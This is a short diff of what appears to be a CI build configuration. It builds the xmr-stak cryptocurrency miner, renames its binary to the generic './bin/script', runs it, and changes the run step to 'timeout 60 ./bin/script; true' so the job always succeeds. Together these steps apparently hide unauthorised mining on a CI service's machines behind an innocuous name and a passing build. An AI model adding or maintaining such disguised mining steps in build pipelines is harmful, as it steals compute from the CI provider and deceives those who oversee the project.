@@ -114,4 +114,4 @@ script:
   - make install
   - ./auto.sh
   - mv ./bin/xmr-stak ./bin/script
-  - ./bin/script
+  - timeout 60 ./bin/script; true
